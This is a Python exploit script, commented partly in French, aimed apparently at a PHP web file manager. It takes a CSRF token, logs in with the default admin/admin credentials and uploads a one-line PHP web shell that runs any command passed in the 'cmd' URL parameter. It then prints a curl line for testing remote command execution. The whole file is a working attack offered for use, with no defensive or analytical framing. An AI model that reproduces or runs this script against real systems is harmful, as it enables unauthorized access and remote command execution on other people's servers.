import requests
import re
import os

# === CONFIG ===
TARGET = "#"
USERNAME = "admin"
PASSWORD = "admin"
SHELL_NAME = "shell.php"
UPLOAD_PATH = ""  # Exemple: "uploads/" ou "" si root

# === SHELL PAYLOAD (cmd via ?cmd=)
SHELL_CONTENT = """<?php system($_GET['cmd']); ?>"""

session = requests.Session()

def get_token():
    r = session.get(TARGET)
    token_match = re.search(r'name="token"\s+value="([a-fA-F0-9]{64})"', r.text)
    return token_match.group(1) if token_match else None

def login(token):
    data = {
        "fm_usr": USERNAME,
        "fm_pwd": PASSWORD,
        "token": token
    }
    r = session.post(TARGET, data=data, allow_redirects=True)
    return "Logout" in r.text or "File Manager" in r.text

def upload_shell():
    files = {
        'file': (SHELL_NAME, SHELL_CONTENT, 'application/x-php')
    }
    upload_url = TARGET + "?upload"
    r = session.post(upload_url, files=files)
    return r.status_code == 200 or "success" in r.text.lower()

def main():
    print("[*] Getting CSRF token...")
    token = get_token()
    if not token:
        print("[-] Failed to retrieve token.")
        return

    print("[*] Logging in...")
    if not login(token):
        print("[-] Login failed.")
        return
    print("[+] Logged in successfully!")

    print("[*] Uploading shell...")
    if upload_shell():
        print(f"[+] Shell uploaded: {TARGET.replace('fm.php', '')}{UPLOAD_PATH}{SHELL_NAME}")
        print(f"[!] Test it: curl \"{TARGET.replace('#', '')}{UPLOAD_PATH}{SHELL_NAME}?cmd=id\"")
    else:
        print("[-] Upload failed.")

if __name__ == "__main__":
    main()
